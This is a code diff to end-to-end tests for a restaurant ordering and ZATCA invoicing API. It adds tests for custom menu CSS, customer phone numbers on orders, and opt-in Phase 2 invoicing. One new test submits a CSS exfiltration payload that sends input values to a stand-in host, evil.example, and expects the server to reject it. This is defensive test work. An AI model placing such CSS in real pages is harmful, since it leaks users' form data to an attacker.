@@ -96,6 +96,43 @@ describe("customer experience + ZATCA foundation (e2e)", () => {
         .send({ vatNumber: "123" })
         .expect(400);
     });
+
+    it("rejects a CSS-exfiltration attempt in the custom menu design", async () => {
+      const res = await request(http)
+        .patch("/tenant")
+        .set("Authorization", `Bearer ${ownerA}`)
+        .send({
+          menuTemplate: "custom",
+          menuCustomCss: 'input[value^="1"] { background: url(https://evil.example/log?1) }',
+        })
+        .expect(400);
+      expect(res.body.message).toMatch(/url/i);
+    });
+
+    it("sanitizes, scopes, saves, and publicly serves valid custom menu CSS", async () => {
+      const res = await request(http)
+        .patch("/tenant")
+        .set("Authorization", `Bearer ${ownerA}`)
+        .send({
+          menuTemplate: "custom",
+          menuCustomCss: ".product-card { border-radius: 4px; }",
+        })
+        .expect(200);
+      expect(res.body.menuTemplate).toBe("custom");
+      expect(res.body.menuCustomCss).toContain("spx-menu-custom .product-card");
+      expect(res.body.menuCustomCss).not.toContain("url(");
+
+      const publicRes = await request(http).get("/public/restaurants/cx-a").expect(200);
+      expect(publicRes.body.restaurant.menuTemplate).toBe("custom");
+      expect(publicRes.body.restaurant.menuCustomCss).toContain("spx-menu-custom .product-card");
+
+      // Reset back to a preset so later tests in this file see the default appearance.
+      await request(http)
+        .patch("/tenant")
+        .set("Authorization", `Bearer ${ownerA}`)
+        .send({ menuTemplate: "classic" })
+        .expect(200);
+    });
   });
 
   describe("external ordering link (/restaurant/{slug})", () => {
@@ -151,7 +188,10 @@ describe("customer experience + ZATCA foundation (e2e)", () => {
       const created = await request(http)
         .post(`/public/tables/${fx.table.qrToken}/orders`)
         .set("Idempotency-Key", key())
-        .send({ items: [{ productId: fx.withSize.id, quantity: 1, modifierIds: [fx.regular.id] }] })
+        .send({
+          items: [{ productId: fx.withSize.id, quantity: 1, modifierIds: [fx.regular.id] }],
+          customerPhone: "+966500000001",
+        })
         .expect(201);
 
       const res = await request(http)
@@ -216,8 +256,11 @@ describe("customer experience + ZATCA foundation (e2e)", () => {
       expect(receipt.body.payload.restaurant.legalName).toBe("شركة مطاعم ألف المحدودة");
       expect(receipt.body.payload.restaurant.address).toBe("شارع العليا، الرياض");
 
-      // Phase 2 readiness: hash chain fields present.
-      expect(receipt.body.invoiceHash).toMatch(/^[0-9a-f]{64}$/);
+      // Phase 2 is opt-in (see zatca-phase2.e2e.spec.ts) — a tenant that
+      // hasn't enabled it gets exactly Phase 1 behavior: no hash chain, no
+      // XML, submission status stays "not_submitted".
+      expect(receipt.body.invoiceHash).toBeNull();
+      expect(receipt.body.xmlContent).toBeNull();
       expect(receipt.body.zatcaStatus).toBe("not_submitted");
 
       // QR image endpoint serves a PNG of the payload.
@@ -305,7 +348,7 @@ describe("customer experience + ZATCA foundation (e2e)", () => {
       await request(http)
         .post(`/public/tables/${fx.table.qrToken}/orders`)
         .set("Idempotency-Key", key())
-        .send({ items: [{ productId: fx.simple.id, quantity: 1 }] })
+        .send({ items: [{ productId: fx.simple.id, quantity: 1 }], customerPhone: "+966500000002" })
         .expect(409);
 
       // The external pickup link is unaffected by the QR toggle.
